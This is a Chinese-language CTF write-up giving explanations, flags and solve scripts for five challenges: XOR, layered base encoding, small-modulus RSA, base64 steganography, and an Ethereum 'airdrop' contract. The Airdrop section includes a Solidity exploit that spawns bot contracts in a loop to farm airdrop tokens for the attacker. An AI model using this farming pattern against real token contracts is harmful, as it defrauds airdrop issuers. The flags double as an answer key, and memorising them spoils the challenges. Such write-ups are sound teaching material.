# Crypto-xor
flag的格式为kap0k{xxx}，如果你拿kap0k和给的密文的前五个字母异或，会发现结果都是0x7，那么只要用0x7和密文异或就可以得到flag

flag:kap0k{xor_with_7}

exp.py
```python
with open('result.txt','rb') as f:
    res = f.readline()
    res = res.encode('hex')
    res = [chr(int(res[i:i+2],16)^7) for i in range(0,len(res),2)]
    print ''.join(res)
```

# Crypto-贝斯家族2.0
其实这题就是base16,base32.base64连续加密了几次，那就一个一个套娃就行了
flag:kap0k{wow_base_family!}

exp.py
```python
import base64

with open('result.txt','rb') as f:
    res = f.readline()
    
    res = res.decode('hex')
    res = base64.b64decode(res)
    res = base64.b32decode(res)

    res = res.decode('hex')
    res = base64.b32decode(res)
    res = base64.b64decode(res)

    print res
```

# Crypto-RSA
就是一个简单的RSA，n很小，在线分解或者用yafu等工具分解，然后RSA解密之后将结果转为字符串即可
flag:kap0k{factor_the_n}

exp.py
```python
import gmpy2

p = 98764321234452424516546135693
q = 98764321234452424516546135813
n = q*p
e = 65537
c = 7538157316728892587460611224718700597719563799427693818960

phi_n = (p-1)*(q-1)
d = gmpy2.invert(e,phi_n)
flag = pow(c,d,n)

print hex(flag)[2:].decode('hex')
```

# Crypto-base64
题目说和AES没关系，其实仔细观察会发现每一行的base64结果解码再编码之后的值有可能和原来的值不一样，这就是base64隐写，所以去网上随便找个脚本梭一下即可

flag:kap0k{this_is_base64_stega_Ahhhhhhhhhhhh}

exp.py
```python
# -*- coding: utf-8 -*-
b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
with open('task.txt', 'rb') as f:
    bin_str = ''
    for line in f.readlines():
        stegb64 = ''.join(line.split())
        rowb64 =  ''.join(stegb64.decode('base64').encode('base64').split())
        offset = abs(b64chars.index(stegb64.replace('=','')[-1])-b64chars.index(rowb64.replace('=','')[-1]))
        equalnum = stegb64.count('=') #no equalnum no offset
        if equalnum:
            bin_str += bin(offset)[2:].zfill(equalnum * 2)
        print ''.join([chr(int(bin_str[i:i + 8], 2)) for i in xrange(0, len(bin_str), 8)]) #8 位一组
```

# Crypto-Airdrop
从名字就可以看出是个薅羊毛的题，依次调用gift->guess->airdrop->transfer即可薅羊毛。函数名都取得是可以直接反编译出来的函数名，自己根据反编译的结果复原一下代码然后薅羊毛即可。至于guess要猜的那个数字有很多获取的方法，比如用web3直接读，或者在线的一些网站也读的出来，这就靠自己去试了
flag:kap0k{Hello_world_eth}

attack.sol
```
pragma solidity ^0.4.24;

contract Rev {
    address owner;
    uint public guessnum = 43967777;
    mapping (address => uint) public balanceOf;
    mapping (address => uint) public gift;
    mapping (address => uint) public level;

    constructor() public {
        owner = msg.sender;
    }

    function backdoor(){
        require(msg.sender == owner);
        balanceOf[owner] = 50000
    }

    function gift() public {
        require(level[msg.sender] == 0);
        require(gift[msg.sender] == 0);

        level[msg.sender] += 1;
        gift[msg.sender] += 1;
    }

    function guess(uint value) public {
        require(level[msg.sender] == 1);
        require( guessnum == value);

        level[msg.sender] += 1;
    }

    function airdrop() public {
        require(level[msg.sender] == 2);

        level[msg.sender] += 1;
        balanceOf[msg.sender] += 100;
    }

    function transfer(address to, uint256 amount) public {
        require(level[msg.sender] == 3);
        require (balanceOf[msg.sender] >= amount);

        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;    
    }

    event SendFlag(string b64email);
    
    function payforflag(string b64email) public {
        require (balanceOf[msg.sender] >= 50000);
        balanceOf[msg.sender] = 0;
        emit SendFlag(b64email);
    }
    
}

contract KongTouBot{
    constructor(address victim, address attack) public payable{
       Rev test = Rev(victim);
       test.gift();
       test.guess(43967777);
       test.airdrop();
       test.transfer(attack, 100);
    }
}


contract Ver{
    function attack(uint num) public {
        for(var i=0; i < num; i++){
            KongTouBot tmp = new KongTouBot(0x1D15BC176336D0A54ff94Cb3dBcBA3B6fE5e1030,msg.sender);
        }
    }
}
```